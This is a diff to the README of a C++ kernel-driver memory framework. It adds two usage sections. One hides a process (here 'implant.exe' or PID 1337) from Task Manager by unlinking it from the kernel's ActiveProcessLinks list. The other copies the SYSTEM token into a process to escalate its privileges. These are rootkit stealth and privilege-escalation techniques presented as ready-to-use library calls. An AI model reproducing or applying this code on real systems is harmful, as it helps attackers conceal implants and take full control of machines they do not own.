@@ -80,6 +80,8 @@
         -   [How to get the process base address via the driver](#how-to-get-the-process-base-address-via-the-driver)
         -   [How to get a module base address via the driver](#how-to-get-a-module-base-address-via-the-driver)
         -   [How to read and write raw buffers via the driver](#how-to-read-and-write-raw-buffers-via-the-driver)
+        -   [How to hide a process from Task Manager](#how-to-hide-a-process-from-task-manager)
+        -   [How to elevate a process to SYSTEM](#how-to-elevate-a-process-to-system)
         -   [A full driver interface example](#a-full-driver-interface-example)
     - [**Basic overlay implementation**](#basic-overlay-implementation)
         -   [How to setup your overlay](#how-to-setup-your-overlay)
@@ -1693,6 +1695,54 @@ The framework contains the following modules:
 
             if( driver->write_buffer( 0xDEADAFFE + 0x100, nops.data(), nops.size() ) )
                 printf( "[+] Patched %llu bytes in target!\n", nops.size() );
+        }
+        ```
+
+    - ### **How to hide a process from Task Manager**
+        The `hide_process()` method unlinks a process from the kernel's `ActiveProcessLinks` list (DKOM). After calling this, the process will no longer appear in Task Manager, Process Explorer, or any tool that relies on `NtQuerySystemInformation`. The process itself continues to run normally.
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void hide_me()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            // Hide the currently attached process
+            driver->attach( L"implant.exe" );
+
+            if( driver->hide_process() )
+                printf( "[+] Process hidden from Task Manager!\n" );
+
+            // Or hide a specific PID
+            if( driver->hide_process( 1337 ) )
+                printf( "[+] PID 1337 hidden!\n" );
+        }
+        ```
+
+    - ### **How to elevate a process to SYSTEM**
+        The `elevate_token()` method copies the SYSTEM token from the kernel's `PsInitialSystemProcess` into the target process, granting it `NT AUTHORITY\SYSTEM` privileges. This is useful for privilege escalation during red team engagements.
+
+        ```cpp
+        #include "osmium/Memory/DriverInterface/driver_interface.hpp"
+
+        void escalate()
+        {
+            const auto driver = std::make_unique< driver_interface >();
+
+            if( !driver->is_connected() )
+                return;
+
+            // Elevate the current process to SYSTEM
+            if( driver->elevate_token( GetCurrentProcessId() ) )
+                printf( "[+] Elevated to NT AUTHORITY\\SYSTEM!\n" );
+
+            // Or elevate a specific PID
+            if( driver->elevate_token( 1337 ) )
+                printf( "[+] PID 1337 elevated to SYSTEM!\n" );
         }
         ```
 
